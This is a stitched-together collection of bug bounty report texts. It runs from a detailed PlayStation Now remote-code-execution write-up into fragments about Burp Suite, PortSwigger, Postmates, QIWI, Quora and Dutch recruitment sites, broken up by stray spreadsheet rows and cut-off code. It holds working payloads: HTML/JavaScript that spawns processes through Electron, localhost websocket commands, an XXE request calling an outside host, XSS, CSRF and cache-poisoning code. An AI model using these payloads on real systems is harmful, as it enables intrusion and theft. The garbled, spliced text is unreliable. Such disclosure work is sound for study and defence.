The PlayStation Now application (psnow moving forward) is an online streaming application for playing PlayStation games. Version 11.0.2 is the current version at the time of writing. The latest version can be downloaded from https://download-psnow.playstation.com/downloads/psnow/pc/latest.
It has two major components: QAS and AGL.

QAS is an executable named psnowlauncher.exe and is a Qt5 desktop application. This is the main application that is executed when the user runs psnow. The default installation location is C:\Program Files (x86)\PlayStationNow\psnowlauncher.exe.
Note: Running it in a Virtual Machine (VM) returns a warning. This can be ignored for this walkthrough.
After launch, it runs a different application called AGL. The following picture is the complete list of processes in Process Monitor.
Processes in procmon:
{F827146}
The QAS application also runs a websocket server at localhost:1235. netstat -anb in an elevated command line tells us about it:
websocket server:
{F827147}
AGL
AGL is an Electron application. In a typical execution, it's spawned by QAS. In the current version, it's run with this url command line parameter:

""C:\Program Files (x86)\PlayStationNow\agl\agl.exe"" --url=https://psnow.playstation.com/app/1.10.43/105/00d3603f8/

This is the URL of the page that will be initially loaded by the AGL application.
AGL execution
{F827149}
Issue 1: nodeIntegration Set to true
nodeIntegration is the ability for the JavaScript running in an Electron BrowserWindow to access the Node.js APIs. The default value is false but it is set to true in AGL. Any JavaScript loaded by AGL will be able to spawn processes on the machine. This can lead to arbitrary code execution. The AGL application performs no checks on what URLs it loads.
We can check this by running AGL from the command line with a URL that contains some Node code. The following code spawns a new processes and runs the Windows Calculator app (calc).
Code 213 Bytes1<html>
2    <head>
3        <title>This should pop calc on Windows</title>
4    </head>
5    <body>
6        <script>
7            require('child_process')
8            .exec('calc')
9        </script>
10    </body>
11</html>
I have stored this payload in an S3 bucket. If we load that remote URL in AGL we can see calc spawning. To reproduce, run the following command in a VM and see AGL running the calculator application:
""C:\Program Files (x86)\PlayStationNow\agl\agl.exe"" --url=https://[redacted].s3.us-east-1.amazonaws.com/node.html
Popping calc:
{F827156}
We can see the new processes in Process Monitor:
{F827151}
This is not that useful. We can run code on our own machine, WOW! As Raymond Chen said It rather involved being on the other side of this airtight hatchway.
Proxying The Applications
We can proxy psnow with Burp. Use the Windows proxy settings (WinINET proxy settings).

Run control.exe inetcpl.cpl,,4. This opens the Windows proxy settings without having to open Internet Explorer.
Click on LAN Settings and set the proxy.

Make sure nothing under Automatic Configuration is checked.
Make sure the Bypass proxy server for local addresses is NOT checked.


Set the proxy to the listener, Burp's default is 127.0.0.1:8080.
Add Burp's Certificate Authority (CA) to the Windows certificate store.

https://portswigger.net/support/installing-burp-suites-ca-certificate-in-internet-explorer
The instructions mention Internet Explorer but it's actually for Windows.



Identifying Traffic in Burp
In Burp, we will see traffic to/from both QAS and AGL. There is other traffic (e.g, browser traffic, Windows update). The traffic from psnow has the word gkApollo in its User-Agent header.
The user-agent for requests coming from the two applications has more indicators:

QAS is the Qt5 app and has QtWebEngine/5.5.1.
AGL is based on Electron and it has Electron/1.4.16 and playstation-now/0.0.0.

I am using a Burp extension named Request Highlighter to highlight requests based on these words in the user-agent.
In my setup, AGL (Electron) is yellow and QAS (Qt5) is blue.
{F827153}
Local Websocket Server
QAS starts a local websocket server on port 1235. Then the website loaded in AGL (in this case ""psnow.playstation.com/app/"") connects to it and sends commands to the server.
Issue 2: Local Websocket Server does not Check the Origin Header
This is a vulnerable setup for seamless communication between a website and a desktop application. A website sends requests to a local webserver to do something (e.g., launch an application). This setup is vulnerable if the local server does not check the Origin header and/or where the request is coming from.
Some examples of other vulnerable setups:
Tavis Ormandy from Google Project Zero found a very similar setup in Logitech Options.

https://bugs.chromium.org/p/project-zero/issues/detail?id=1663

Another by TavisO for TrendMicro. Not websocket but involved a local webserver: https://bugs.chromium.org/p/project-zero/issues/detail?id=693
Zoom used a local webserver to automatically launch the application from the website. Disclosure by Jonathan Leitschuh.

https://medium.com/bugbountywriteup/zoom-zero-day-4-million-webcams-maybe-an-rce-just-get-them-to-visit-your-website-ac75c83f4ef5

Why is this bad? Any website can send these commands. This means I can put JavaScript code on my own website. If a user running psnow opens my website on the same machine (in any browser), my website connects to http://localhost:1235 and sends requests to the websocket server. These requests will be processed.
Yet Another Chat Application as Proof of Concept
I stole the client code of a websocket chat app and modified it to simulate the evil website. This small app connects to ws://localhost:1235, prints any message received and allows us to send messages at will. You can see the source at:

https://[redacted].s3.amazonaws.com/agl-poc/chat-ws.html
Open the page in a browser in a different machine and see the source. It's simple enough that I could understand it.


Start the psnow app in a VM.
Open the above URL in a browser in the same VM.
See the websocket messages from the psnow app in the browser.

If we keep the chat app running, it will keep printing messages received from the client.


Send any message to the local server via the text field.

{F827145}
Websocket Messages
Now we need to look into the websocket messages and how we can exploit them.
After opening the initial URL at https://psnow.playstation.com/app/1.10.43/105/00d3603f8/ we can see the Connection: Upgrade request to this server from psnow.playstation.com. This is coming from the psnow website loaded in AGL. The initial request is a typical websocket handshake.
{F827150}
Now we can switch to the Proxy > Websockets history tab in Burp to see the websocket messages.
{F827152}
All the requests are in JSON (probably created by JSON.stringify). The interesting ones start with command. For example:
Code 87 Bytes1{
2  ""command"": ""isMicConnected"",
3  ""params"": {},
4  ""source"": ""AGL"",
5  ""target"": ""QAS""
6}

command: What to do.
params: Command parameters.
source: The program issuing the command.
target: The program running the command.

Both target and source can be the same app. I do not think it really matters what the source is. I think only target is mandatory.
We can search for more commands in websocket messages. The most important command is setUrl. There are more commands in the source of the Electron app (unpack app.asar and search for commandHandler) but this is the most useful along with setUrlDefaultBrowser (opens a URL in the default browser on the machine).
{F827154}
Code 152 Bytes1{
2  ""command"": ""setUrl"",
3  ""params"": {
4    ""url"": ""https://psnow.playstation.com/app/1.10.43/105/00d3603f8/""
5  },
6  ""source"": ""AGL"",
7  ""target"": ""QAS""
8}
This is AQL telling QAS to load this URL. QAS will then go and load that URL. We can send this request to Burp Repeater and send the message again with a different URL. For example, let's tell QAS to load https://example.net.
{F827155}
But this is not fun. We want AGL to load websites and not QAS. WHAT IF we switched target and source?
Code 89 Bytes1{""command"":""setUrl"",""params"":{""url"":""https://example.net""},""source"":""QAS"",""target"":""AGL""}
This command will tell AGL (the Electron app) to load example.net. The gif has been minimized, please click on it to enlarge it:
{F827144}
Later, I found out that we can use another TavisO bug to get RCE another way. https://bugs.chromium.org/p/project-zero/issues/detail?id=693
We can abuse the setUrlDefaultBrowser command. It gets passed to shell.openExternal(url) and allows the file scheme.
So the following command should pop calc:
Code 120 Bytes1{""command"":""setUrlDefaultBrowser"",""params"":{""url"":""file:///c:/windows/system32/calc.exe""},""source"":""QAS"",""target"":""AGL""}
Note: QAS does not have this command.
Websockets are not bound by the Same-Origin Policy so any website can send these messages. For an explanation please see https://blog.securityevaluators.com/websockets-not-bound-by-cors-does-this-mean-2e7819374acc.
Issue 3: You Can Tell AGL to Load Arbitrary Websites
A single websocket message is enough to make AGL load any URL. There are no restrictions here. This is not great, considering we saw what bad code on a website can do to AGL.
Putting Everything Together
So far we have established three things:

If a website with Node code is loaded in AGL, we can run arbitrary on the target's machine.
Any website opened in the browser on a machine with psnow running can connect to the local websocket and send messages.
A websocket command with setUrl or setUrlDefaultBrowser can tell AGL to load any URL.

Possible Attack Scenario

User is running psnow on their machine.

Note that when the users close the psnow window it gets minimized to tray and is still running. So there's a good chance that psnow is running  if they have used it in the same session. The websocket server is still running when the application is minimized.


The user opens a website in their browser. Any browser will do.

Someone can post a link to a website with bad code in chat/Discord, it could be a link on forums. The possibilities are endless.


The website in the browser connects to the websocket server at ws://localhost:1235.
The website sends a message to the websocket server. The message tells AGL to load another website that contains node code.

{""command"":""setUrl"",""params"":{""url"":""https://[redacted].s3.us-east-1.amazonaws.com/node.html""},""source"":""QAS"",""target"":""AGL""}
Alternatively, it can abuse the setUrlDefaultBrowser command.


AGL loads the new website. Arbitrary code runs on the user's machine.
???
RCE.

Steps To Reproduce:
If you have read up until here, you deserve a calc popping gif.

Run psnow in a VM.
Go to the following URL in a browser on the same machine:

https://[redacted].s3.amazonaws.com/agl-poc/calc-ws.html


Watch calc pop.
Optionally, paste the following command in the text field and press send to see calc pop again.

{""command"":""setUrl"",""params"":{""url"":""https://[redacted].s3.us-east-1.amazonaws.com/node.html""},""source"":""QAS"",""target"":""AGL""}
You can also do other fun things like enabling dev tools.



The code in calc-ws is similar to the chat code. After the socket to the local websocket server opens, the payload above is sent. See the modification heres:
Code 384 Bytes1let url = 'ws://localhost:1235/'
2
3let socket = new WebSocket(url);
4
5let payload = '{""command"":""setUrl"",""params"":{""url"":""https://[redacted].s3.us-east-1.amazonaws.com/node.html""},""source"":""QAS"",""target"":""AGL""}';
6
7// send the payload when the socket is opened.
8socket.onopen = function(event) {
9  showMessage('before payload');
10  socket.send(payload);
11  showMessage('after payload');
12};
The following gif shows the whole chain. Again, please see it in full-size.
{F827148}
Bonus: Minor Issue 0: Websocket Server Listening on 0.0.0.0
The application is listening on all interfaces (0.0.0.0) which is problematic. This is also not fun because the Windows firewall prompt will pop up when its executed for the first time. Meaning anyone who can contact this port might be able to send commands to this websocket server.
Remediation or How Can We Fix This?

Quick and effective win: The local websocket server should validate the Origin header of the incoming request and only allow requests from good Origins specified in a list.

This is the same recommendation by TavisO in https://bugs.chromium.org/p/project-zero/issues/detail?id=1663. And he is much smarter than I will ever be.


Bonus win: Do not listen on all interfaces, bind the server to localhost.

It warns if it is a self signed one, but if it is a legitimate one (any valid CA), it appears not to be checking the CN.
This is an issue for the polling service, since it allows for the connection to be intercepted and burp will happily send through the polling request.
For PoC, just use a valid certificate for a completely different domain than the one used on the burp collaborator server, and connect to it. All checks will be ok, and when polling the server (using the scanner for instance), there's no warning or failure, and burp connects.
I haven't extensively tested all possible options, but using a valid wildcard certificate from a totally different domain works.
(note: there's also the functional bug of burp stating the connections are ok, but the target being tested will then fail to connect to any TLS service on the collaborator)
Impact
If the attacker is able to perform a MITM on the tester (either adjacent to him, or to the collaborator server, or somewhere along the path), he will be able to intercept the HTTPS polling connection to the collaborator server, and potentially obtain the records.4 attachments:F285736: collab_config.pngF285737: wrong_domain_certificate_ok.pngF285738: tls_error.pngF285741: not_this_domain.png",https://hackerone.com/reports/337680,England,United Kingdom,Knutsford,2018,4,14,9,38

CWE-494: Download of Code Without Integrity Check
PortSwigger maintains several Open Source Projects under the PortSwigger GitHub organization. Some of these projects contain build files that indicate that some of these projects are resolving dependencies over HTTP instead of HTTPS. This allows these artifacts to be potentially MITMed to maliciously compromise them and infect the build artifacts that are produced. Additionally, if any of these JARs or other dependencies were compromised, any developers or production servers using these could continue to be infected past updating to fix this.
Description:
This attack leverages the build infrastructure loading dependencies over HTTP without any other sort of integrity check to allow them to be maliciously compromised.
This isn't just theoretical

At a minimum, all of these code locations where artifacts are downloaded from an untrusted source needs to be fixed. Previous releases should be rebuilt with the fix applied. The checksum of the released artifacts and artifacts built in a trusted environment should be made. If the checksums match, you can be certain that they weren't compromised.
If the checksums don't match, indicating a compromised artifact, CVE numbers need to be issued for the potentially malicious artifacts.
The ability to check if checksums match assume that these projects have reproducible builds.
Steps To Reproduce:

Cone the Impacted Project
Change this line in Dilettante so it is targeting the repository used in the build.
https://github.com/mveytsman/dilettante/blob/master/dilettante.py#L143
Start Dilettante on your local machine.
Proxy the HTTP traffic for the build through Dilettante
Execute the Build's tests.
You should be greeted with the image of a cat.

Other Places to Look
Given how widely I'm finding this vulnerability externally, I'd advise that the Port Swigger Security team take some time to also analyze their internal infrastructure for similar vulnerabilities.
This responsible disclosure follows Google's 90-day vulnerability disclosure policy (I'm not an employee of Google, I just like their policy).
Impact
By insecurely downloading code over an untrusted connection HTTP and executing the untrusted code inside of these JAR files as part of the unit/integration tests before a release opens these artifacts up to being maliciously compromised.
Remote code execution on a production server. Malicious compromise of build artifacts.Summary by jlleitschuhThis report was part of a 4 month research project into the general supply chain security of the JVM ecosystem. This vulnerability impacted organizations like the Apache Foundation, Eclipse Foundation, Elastic Search, JetBrains, Jenkins, Oracle, Google, Gradle and many other open source projects including both the Kotlin and Groovy compiler.

PortSwigger Web Security,11-50,0.0,1m-10m,"$1,000.00",Medium,5.45,Information Disclosure,HTML Injection in Swing can disclose netNTLM hash or cause DoS,"issuefinder  submitted a report to PortSwigger Web Security.Dec 8th (2 years ago)The vulnerability is like a SSRF but on the client side, where an attacker can force an unsolicited hidden request made by Burp Suite when the victim performs some actions.
During normal browsing to a website through Burp Suite (Pro or Community), if the website makes a request with HTML code in a GET parameter or in a POST body, and the auditor (the victim):

Intercepts that request, or
Selects that request in HTTP history (Proxy tab), or
Sends that request to repeater, or
In repeater, makes any change to the HTML code (preserving the main structure),

Burp Suite will do an unsolicited hidden request to the destination specified in the ""img"" or ""link"" HTML tags.
Next, you can see a GET and a POST example that trigger an unsolicited hidden request to ""http://www.rec2.ml/leak"" just by pasting them on a repeater tab:
GET request (using the ""img"" tag)
Code 93 BytesWrap lines Copy Download1GET /burpsuite_leak_vuln-leak_impact.html?=<html><img+src='http://www.rec2.ml/leak'> HTTP/1.1
POST request (using the ""link"" tag)

2Content-Type: application/x-www-form-urlencoded

4=<html><link+rel='stylesheet'+href='http://www.rec2.ml/leak'>
In fact, a smaller payload to produce the same behaviour can be achieved by pasting the following on a repeater tab:
Code 43 BytesWrap lines Copy Download1?=<html><img+src='http://www.rec2.ml/leak'>
Impact
An attacker can exploit this vulnerability in at least 4 different ways:
##1. Real public IP address leak
The unsolicited hidden request does not respect the configuration in User options tab:

Upstream Proxy Servers
SOCKS proxy

An auditor (the victim), trying to hide his real public IP address from an audited website (using an upstream proxy server or a SOCKS proxy), would be leaking it without being aware of this fact.
Affected OS: Linux, MacOS, Windows
PoC video: burpsuite_leak_vuln-leak.mp4
##2. Windows NetNTLM hashes leak
If the HTML code uses the “file://” scheme instead of the “http[s]://” , it will produce an unsolicited hidden request using the SMB protocol that will negotiate and leak the auditor's:

Username
Computer name or domain
NetNTLM hash

The NetNTLM can be cracked and therefore used at a later stage.
To negotiate and get the NetNTLM hash an attacker can use Responder (https://github.com/lgandx/Responder).
Affected OS: Windows
PoC video: burpsuite_leak_vuln-netntlm.mp4
##3. RCE on other machines
To perform this attack in the best scenario, an attacker must be on the same internal network with network visibility with the victim (auditor).
This attack is a variant of the previous one (2. Windows NetNTLM hashes leak) in which, instead of cracking the NetNTLM hash, the attacker does a MiTM to relay the SMB negotiation to other machines (without SMB signing enabled) and obtain a RCE in the context of the victim.
The HTML code must also use the “file://” scheme instead of the “http[s]://” , to produce an unsolicited hidden request using the SMB protocol.
To relay the SMB negotiation an attacker can use ntlmrelayx (https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py).
Affected OS: Windows
PoC video: burpsuite_leak_vuln-rce.mp4
##4. Denial of Service (DoS).
If the attacker does not respond to the unsolicited hidden request made by Burp Suite and keeps the TCP connection open, then it can freeze Burp Suite execution, forcing the auditor (victim) to lose the unsaved changes.
Affected OS: Linux, MacOS, Windows

Steps to reproduce:

Set up an open redirection on a site you control (example.com).
Set up Platform Authentication for that same site. Use HTTP Basic auth and whatever credentials.
Using Repeater, issue a request to the page with the open redirection:

Code 67 BytesWrap lines Copy Download1GET /redirect.php?url=http://evil.com HTTP/1.1

5
Note that there's nothing ""unusual"" about the steps to reproduce this, so it can easily happen completely by accident. On the attacker's side, exploiting this only requires logging any incoming Authorization headers.

There is a reflective XSS vulnerability in portswigger.net. The flash file https://portswigger.net/burp/tutorials/video-js/video-js.swf is from an old video.js library (version 3.2.0) which is vulnerable to XSS.
This XSS will be blocked by CSP instruction object-src https://portswigger.net/knowledgebase/papers/; but it will execute on browsers that don't enforce this CSP like Internet Explorer 11.
POC link : https://portswigger.net/burp/tutorials/video-js/video-js.swf?readyFunction=alert%28document.domain%2b'%20XSSed!'%29
POC instructions :

Open the POC link in Internet Explorer 11 with flash active
The javascript payload executes in https://portswigger.net
(Tested on Windows 10)

Mitigation :
To solve this issue, replace the old https://portswigger.net/burp/tutorials/video-js library with the updated video.js library from http://videojs.com/. It is also better to host any swf file on a sandbox subdomain.

Postmates,5001-10000,0.0,50m-100m,$500.00,High,8.2,Violation of Secure Design Principles,Web cache poisoning attack leads to user information and more,"davidalbert  submitted a report to Postmates.Feb 8th (4 years ago)Hello,
Your Web-Server is vulnerable to web cache poisoning attacks.
This means, that the attacker are able to get another user informations.
If you are logged in and visit this website (For example):
https://postmates.com/SomeRandomText.css
Then the server will store the information in the cache, BUT with the logged in user information :)
A non-logged-in user can then visit this website and see the information contained therein.
In that case, this url: https://postmates.com/SomeRandomText.css
I have written a small javascript / html code, which executes this attack fully automated, you just need to visit the website and wait like 3 seconds.
Here is the small PoC code
Code 913 BytesWrap lines Copy Download1<html>

14            content += alphaWithNumber.charAt(Math.floor(Math.random() * alphaWithNumber.length))
15        }
16        return content;
17    }

19    var checker = setInterval(function() {
20        if (popup.closed) {
21            clearInterval(checker);
22        }
23    }, 200);
24    var closer = setInterval(function() {
25        popup.close();
26        document.body.innerHTML = 'Victims content is now cached <a href=""' + cachedUrl + '"">here and the url can be saved on the hackers server</a><br><b>Full Url: ' + cachedUrl + '</b>'; 
27        clearInterval(closer);
28    }, 3000);

Theoretically, the attacker could then store this information on his server, but in this example, the URL is simply shown.
I would suggest keeping an eye on caching for more security and hope you enjoyed my report.

The attack allows an attacker to open local files (although perhaps not return the data, see below), leading at best to a DoS.
Often this attack can be used to extract files from the server (such as /etc/passwd), or even directly execute code if the PHP expect module is installed, however in this case exploitation isn't as straight forward as the issue occurs in the XML pre-check code and no user input is returned. That's not to say there isn't a away to exfiltrate data, but I haven't had time to fully investigate.
At best, this attack can be used as a denial-of-service, opening up /dev/random thousands of times until the server falls over through memory use and CPU load.
Proof-of-concept (change bitquark.co.uk to a site you control and watch the access logs; or change to file:///dev/urandom and the script will hang):
    POST /soapserver/ HTTP/1.1
Host: send.qiwi.ru
Content-Type: application/x-www-form-urlencoded
Content-Length: 254
    <?xml version=""1.0"" encoding=""UTF-8""?><!DOCTYPE aa[<!ELEMENT bb ANY><!ENTITY xxe SYSTEM ""https://bitquark.co.uk/?xxe"">]>
    <SOAP-ENV:Envelope>
<SOAP-ENV:Body>
<getStatus>
<id>&xxe;</id>
</getStatus>
</SOAP-ENV:Body>
</SOAP-ENV:Envelope>
You'll get the error ""DTD are not supported by SOAP"", but the attack will have succeeded.

QIWI,1001-5000,0.0,200m-1b,$300.00,Critical,9.5,Session Fixation,account takeover https://idea.qiwi.com/ ,"circuit  submitted a report to QIWI.Dec 17th (4 years ago)Здравствуйте. Обнаружил account takeover на данном сайте. С воспроизведением придется поднапрячься, но это стоит того. Учитывая то, что на сайте есть админский аккаунт, в теории можно натворить делов.
Скажу сразу, что мне не удалось полностью понять механизм работы данного тейковера и я буду очень сильно дволен, если после фикса вы расскажете из-за чего он все таки существовал.
Как я понял проблема возникает из-за того, что сессии при логине примерно в одно и то-же время
каким-то образом могут дублироваться.
Мой способ воспроизведения, который работает примерно в 70% случаев:

Удаляем куки в своем браузере;
Удаляем куки в браузере друга; 
Заходим на https://idea.qiwi.com/, попутно включая интрудер в бурпе -> мотаем запросы до того момента, пока не увидим этот запрос
Image F391861: request.png 49.34 KiBZoom in Zoom out Copy Download
Просим друга залогиниться на сайте через ВКонтакте и сразу после того, как он залогинился отправляем данный запрос.
Мы вместо своего аккаунта попадаем в аккаунт к ДРУГУ.

Если не работает сразу, чистите куки и повторяйте. Мне было очень сложно понять как именно придти к более-менее рабочему способу воспроизведения.
Impact
Что мы имеем в итоге:

После того, как получилось проэксплуатировать уязвимости кука PHPSESSID в нашем браузере совпадает с кукой PHPSESSID в браузере жертвы;
Мы получаем полный доступ к аккаунту жертвы;
Повторяя данные действия бесконечно (возможно каким-то образом можно сделать программную автоматизацию), мы можем рано или поздно попасть в админский аккаунт;
За время тестирования удалось зайти в несколько аккаунтов и вопспроизвести моим методом сразу с несколькими друзьями:

Quora,501-1000,0.0,10m-50m,$600.00,Low,2.0,Cross-site Scripting (XSS) - Reflected,XSS through `__e2e_action_id` delivered by JSONP,"0xnan  submitted a report to Quora.Aug 11th (5 years ago)Summary:
The __e2e_action_id params used with POST requests to /server_call_POST?_m=* endpoint is not properly escaped when reflected back on a response allowing to inject Javascript.
Also, another issue on some methods (such as /server_call_POST?_m=edit) allows - with a strong premise discussed on the description - any authenticated user to deliver the vulnerability to another user without any interaction.
Description
XXS
On the Web Application http://www.quora.com most user actions are performed as POST on /server_call_POST?_m=*, implementing AJAX architecture.
On the client side these requests are processed by  ./shared/core/rpc.js library that in turns uses the library ./actions.js to define ""actions"" which have an ID __e2e_action_id and some methods such as startAction() and finishAction(id, ...).
The __e2e_eaction_id is generated for every request with id = (1e3 * e.startTime + Math.floor(1e3 * Math.random())).toString(36) so its value is intended to be composed by [0-9a-z].
When a user performs an action, this ID is embedded on the POST request and with some methods (for
example /server_call_POST?_m=load_menu) its content is reflected back as first argument of
finishAction().  For example a ""normal"" call, with __e2e_action_id=esko02tjqe is the following (I've omitted most headers/params/data):
Code 721 BytesWrap lines Copy Download1curl 'https://www.quora.com/webnode2/server_call_POST?_v=####&_m=load_menu'  
2-data 'json=...&__e2e_action_id=esko02tjqe&...'
3
4> POST /webnode2/server_call_POST?_v=█████&_m=load_menu HTTP/1.1
5> Host: www.quora.com
6> Cookie: █████████████████████
7...
8< HTTP/1.1 200 OK
9< Content-Type: application/json; charset=utf-8
10< Server: nginx
11< 
12{""value"": {
13     ""html"": ..., 
14      ""css"": .......,                             (↓↓↓↓↓↓ reflected ID)
15       ""js"": ""require('actions').finishAction('esko02tjqe', {\""controller\"": \""webnode2\"", \""action\"": \""server_call_POST\"", \""standard\"": {}, \""serverTime\"": 34511, \""mustReport\"": true});\n            var webnode = require('shared/core/webnode');\n   ....     ""}, 
16   ""pmsg"": null}
Since no escaping is performed, it is possible to inject code, for example setting __e2e_action_id=',alert(),' which will produce:
Code 78 BytesWrap lines Copy Download1...
2 ""js"": ""require('actions').finishAction('',alert(),'', {\""cont... ""}, 
3...
creating a valid js section that execute alert().
Fortunately this vulnerability can't be triggered as it is because this would require the malformed request to be sent by Quora.com since it is ./shared/core/rpc.js that execute the response (that has a content type of application/json) and seems that there is no way to directly set the __e2e_action_id on a session of Quora (a new one is generated  for each action).
Deliver the XSS using JSONP
I've noticed another ""vulnerability"" that can be chained with the aforementioned to be able to effectively
deliver the XSS to an user.
When an user is on Quora, to its page is associated a ""channel"" (I hope this is the correct name) such as main-w-dep3105-32490323.... and there is always a request that try to fetch new ""update"" from a
channel (restarted each time it returns).
This request is update on *.tch.quora.com, for example:
Code 272 BytesWrap lines Copy Download1REQUEST
2https://tch969298.tch.quora.com/up/chan43-8888/updates?&callback=jsonp<callback_name>&channel=main-w-dep3105-32490323....&hash=16762940...
3
4POSSIBLE RESPONSE:
5jsonp<callback_name>({""messages"":[""require.whenReady(\""main\"", function() {\n ... ,""min_seq"":1591113381})
The action /server_call_POST?_m=edit (used for example when an user change its profile description), do not behave like /server_call_POST?_m=load_menu (described in the first section). What I mean is that they do not reply with the response {""value"": {""html"": ..., ""css"": ...., ""js"": ...}, ""pmsg"": """"} to update the page but they reply with a response {""value"": null, ""pmsg"": null} and deliver the update through a message on the channel of the user.
For example after a /server_call_POST?_m=edit with __e2e_action_id=eskrisktsq the /update? request reply with:
Code 266 BytesWrap lines Copy Download1jsonp<callback_name>({""messages"":[""require.whenReady(\""main\"", function()
2 {require('actions').finishAction('eskrisktsq' ... <other data of the edit action>
3                                     ↑↑↑↑↑
4             (__e2e_action_id of the _m=edit call reflected)
5     
on which eskrisktsq is the __e2e_action_id used on the _m=edit call vulnerable to XSS.
The fact that _m=edit sent a message to the channel main-w-dep3105-32490323.... it's because this channel is specified as parameter on the request _m=edit:
Code 398 BytesWrap lines Copy Download1curl 'https://www.quora.com/webnode2/server_call_POST?_v=███████&_m=edit' 
2--data 'json={
3""args"":[],""kwargs"":{the data of the edit}}&
4revision=███████████&
5formkey=███████████&
6postkey=███████████&
7window_id=dep3105-32490323....&                          ← specified here
8_lm_window_id=dep3105-32490323....&                      ←   and here
9__e2e_action_id=eskrisktsq&
10&__vcon_json=[█████]&.....' 
The real problem is that this method do not check if the specified channel is associated to user session who performed the call. So what could happen is that the attacker can send the XSS to
a specified channel name that will be triggered as soon as the update? request (of the victim user) receives the evil data, without any interaction of the victim.
The effect of _m=edit (eg: change the profile description) is applied to the Attacker profile (since on the request are used Cookies, formkey and postkey of the Attacker) but the finishAction() message (vulnerable to XSS) is sent to the victim channel name.
I can confirm that this behavior is not present on other methods: for example with _m=load_menu if you try to change the window_id you obtain a 500 Internal Server Error, this should demonstrate that there is some check missing on methods such as _m=edit.
I've not tested other methods, anyway I think that all the methods that reply with {""value"": null, ""pmsg"": null} are vulnerable but not the ones that reply with the update directly (as _m=load_menu does) .
The strong premise said on the summary is that an attacker should know the victim channel_name and, that seems not easy to obtain, but if there are ways to do this, this vulnerability will become a serious problem since no victim interaction is required to perform the attack.
Anyway is still possible to do a bruteforce on channel name spreading the attack on random users. To this end I want to call on your attention some pro/cons aspect for the attacker:

There could be easy ways that I did not find to leak valid channel_name
The attack can't be stopped from browser XSS filters
The XSS seems to work only on Quora.com (Android do not use __e2e_action_id, IOs not tested)
A channel_name is composed of dep<4 digit[0-9]>-<up to 19 digit[0-9]>. Valid 4 digits for dep
can be leaked using https://www.quora.com/check_livedeps/index?window_id=dep3304-
that seems to respond with ""ok"" if the 4 digits (in this case 3304) are part of a channel alive.
the remaining part is infeasible to enumerate (10^19), but should be noted that:


doing the evil request returns an HTTP status code 200, so the attack can be distributed on multiple Attacker's Quora Profiles created for the attack, and metrics such as increased error rate (http 500) do not highlight any attack.
if the XSS is sent to a channel_name that is not used by any user and Quora assigns this
channel_name, up to 5minutes later the evil request was sent, the XSS is delivered correctly.
(BTW I do not know if Quora would assign a channel name on which a message is already ""pending"")
-I think the attacker can keep busy some channels name (reducing the space to enumerate),
logging and executing the same code that Quora uses to attach a channel to an user, e.g:   

Code 267 BytesWrap lines Copy Download1 require(""tchannel_up"").start(0, ""main-w-dep3104-34040..."", ""2287...."", ""chan42-8888"", ""quora.com"", """");
2
3or simply a repeated GET on:
4
5https://tch969298.tch.quora.com/up/chan42-8888/updates?&callback=jsonp<callback_name>&channel=main-w-dep3104-34040...&hash=2287....
since seems that there isn't a limit on how much ""active"" channel are reserved for a user session (I've not tried extensively, but i've executed 3 time the code with channel saved from past session - since you need the hash params - and works).
Steps To Reproduce
I describe the steps using browser Chromium, but it is not stricly necessary


Attacker log in on Quora.com and goes on its profile page 


Attacker open developer tools of its browser and goes on the ""Network"" tab


Attacker update its profile description using dummy data and copy the request performed on server_call_POST?_m=edit, eg:

the attacker obtain the victim channel name, eg: dep3501-3261853912009855464

When sending too much data through file upload, the server returns an invalid 500 status code instead of the speed 429 status code, causing an internal denial of service.
Description
I uploaded a file from the https://www.werkenbijbakertilly.nl/vacatures/solliciteer/senior-hr-consultant-317 page to test the speed limit, bypass, problem, and hit submit to start testing the speed limit did. As a result, while investigating the problem, we found an interesting bug. First, I found that if I send too many requests to the server, a slow response and an internal denial of service occur with 500 status codes instead of 429 status codes.
I knew that this would result in a real denial of service, and I immediately stopped testing. In addition, we found that when denial of service is activated through the 502 status code, some information is exposed. A report on the release of this information was rewritten by #892610.

Steps To Reproduce :

Go to the https://www.werkenbijbakertilly.nl/vacatures/solliciteer/senior-hr-consultant-317 Page.
Basically I need to upload a cv file when uploading the file. This is a normal cv file. Please upload this file CV___________.docx (F856943)
Submit a form upload a file, and grap the packet.
Now we need to send too many requests to activate the 500 code.
Send a lot of data through Burp Suite -> Intruder function.
Now, when the 500th code is activated, the internal service denial occurs through the 502 status code.

Recommendation
If you send too many requests, the server should not have code 500 activated. Reimplement to enable the 429 status code.
Impact

This vulnerability consists in :
https://mijn.werkenbijdefensie.nl/instellingen/gegevens/
This vulnerability allows an attacker to edit courses that do not belong to him and remove them from the users account.
The edited course ends up in the attackers  account, but gets deleted from the account of the user that made the course.
Proof of concept

Create 2 accounts
go to https://mijn.werkenbijdefensie.nl/instellingen/gegevens/
start intercepting the requests
add a course in one account and look at the reponse of the POST request that is made to add this course. It is a number.
Now go to the other account also make a course.
Edit this course, and capture the POST of the request that is made to edit the course.
Repeat the request but change the ""id"" parameter to the id the course that was made in the other account.
reload the page
The course got removed from the creator's account and was inserted into the account of the attacker.

The ID of the event is given, which can be found for everyone on the events-overview page. It would be very easy to make an attack page including all events, unsubscribing all users.
Browsers Verified In:

Chrome Version 56.0.2924.87 @ Windows 10

Steps To Reproduce:

User should be logged in to mijn.werkenbijdefensie.nl
User should visit a page with the following HTML (for example, triggering the GET in any way is good enough):

Code 284 BytesWrap lines Copy Download1<html>
2<head>
3<title>CSRF</title>
4</head>
5<body>
6
7You're unsubscribed from activity # 301449 and # 301731

9<img src=""https://mijn.werkenbijdefensie.nl/activiteiten/uitschrijven/301731"" />
10
11</body>
12</html>

User is unsubscribed from the specific activities

Known steps to resolve:
Do not use the GET-method for any operation that changes something. Next, add an anti-forgery token as is present everywhere on the site.

Steps To Reproduce:

Log in to mijn.werkenbijdefensie.nl
Go to https://mijn.werkenbijdefensie.nl/instellingen/gegevens/#tab2 (or click the tab ""Opleidingen & Cursussen"" in your personal data)
Add an education or course
Inspect the ""edit""-button of the just created course. Change the data-id to an lower ID that does not belong to you.
Click the edit button from which you changed the id. A popup will open with the data of the course that is not yours.
Change this data and save it. The course will now be yours, and removed from the other users profile.

I've tested it with my own two user accounts, so no data of other users is leaked or changed by me.
Known steps to resolve:
Check if the requested course/education belongs to the user.

Because the message contents couldn't actually be read and only a deletion is possible, it'd require a manual restore for a backup that we confirmed we had. This endpoint is also never hit (because it's not available in the UI, you'd have to explicitly craft this type of request) it'd be detected fairly quickly if someone were to try and destroy all the messages.

